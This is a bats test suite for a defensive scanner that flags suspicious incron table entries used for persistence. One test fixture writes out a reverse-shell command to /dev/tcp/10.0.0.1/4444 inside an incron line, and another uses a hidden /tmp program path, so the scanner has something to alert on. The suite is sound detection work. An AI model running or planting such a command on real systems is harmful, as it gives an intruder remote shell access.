#!/usr/bin/env bats
# L2 bats functional tests for the incron-watchdog scan script.
#
# incrond runs the command in each incrontab line (`<path> <mask> <command>`)
# under /etc/incron.d and /var/spool/incron when the watched path receives a
# matching inotify event — an attacker can trigger their payload on demand by
# touching the watched path (T1546). A table file that is world-writable /
# non-root-owned, or whose command program is under a writable root or
# carries an injection pattern, is alert.
#
# Run with: bats packaging/test/L2-incron-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/incron-watchdog/systemd/incron-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    INCD="${TMP}/incron.d"; mkdir -p "${INCD}"
    TAB="${INCD}/nginx"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_INCRON_PROFILE="${PROFILE:-report}" \
    SELFDEF_INCRON_BASELINE="${BASELINE}" \
    SELFDEF_INCRON_DIRS="${DIRS_V:-$INCD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '/etc/nginx IN_MODIFY /usr/sbin/nginx -t\n' > "${TAB}"
}

@test "no incron tables → ok / no_incron" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_incron"'
    cap | grep -q '"severity":"ok"'
}

@test "benign incron table, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged incron table on second run → ok / incron_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"incron_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a command program under a writable root → alert / incron_suspicious" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /tmp/.x\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"incron_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in the command → alert" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable incron table → alert" {
    seed_benign
    run_wd
    chmod 0666 "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign incron table change → warn / incron_changed" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_CLOSE_WRITE /usr/sbin/nginx -s reload\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"incron_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign /usr-rooted command is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious command" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /tmp/.x\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
